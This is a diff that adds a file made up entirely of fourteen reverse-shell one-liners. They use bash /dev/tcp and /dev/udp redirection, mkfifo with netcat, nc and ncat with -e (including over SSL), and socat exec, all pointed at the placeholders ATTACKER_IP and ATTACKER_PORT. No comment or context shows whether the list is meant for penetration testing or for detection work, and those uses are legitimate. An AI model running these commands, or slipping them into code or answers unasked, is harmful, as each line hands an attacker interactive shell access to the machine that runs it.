@@ -1,0 +1,14 @@
+bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'
+/bin/bash -l > /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0<&1 2>&1
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT; sh <&196 >&196 2>&196
+exec 5<>/dev/tcp/ATTACKER_IP/ATTACKER_PORT;cat <&5 | while read line; do $line 2>&5 >&5; done
+sh -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1
+mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+nc ATTACKER_IP ATTACKER_PORT -e /bin/sh
+nc ATTACKER_IP ATTACKER_PORT -e /bin/bash
+ncat ATTACKER_IP ATTACKER_PORT -e /bin/sh
+ncat --ssl ATTACKER_IP ATTACKER_PORT -e /bin/sh
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
+socat tcp-connect:ATTACKER_IP:ATTACKER_PORT exec:sh,pty,stderr,setsid,sigint,sane
